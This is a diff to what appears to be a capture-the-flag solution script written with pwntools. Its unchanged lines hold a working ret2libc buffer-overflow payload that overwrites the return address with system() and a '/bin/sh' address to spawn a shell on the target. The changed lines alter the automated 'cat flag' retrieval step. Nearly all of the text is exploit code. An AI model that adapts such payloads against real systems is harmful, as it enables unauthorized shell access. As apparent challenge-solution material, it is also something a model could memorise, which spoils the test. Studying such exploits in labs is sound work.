@@ -39,12 +39,11 @@ bin_sh_addr = 0xf7f501db
 
 payload = b"A" * max_len + p32(system_addr) + b"A" * 4 + p32(bin_sh_addr)
 io.send(payload)
-io.interactive()
 
 # END CHALLENGE-SPECIFIC CODE
 # BEGIN FLAG RETRIEVAL BOILERPLATE
 
 import re
-io.sendlineafter(b'Spawning a privileged shell', b'cat flag')
+io.sendlineafter(b'!', b'cat flag')
 flag = re.search(br'candl\{[ -z|~]*}', io.recvregex(br'candl\{[ -z|~]*}')).group(0)
 print(flag)
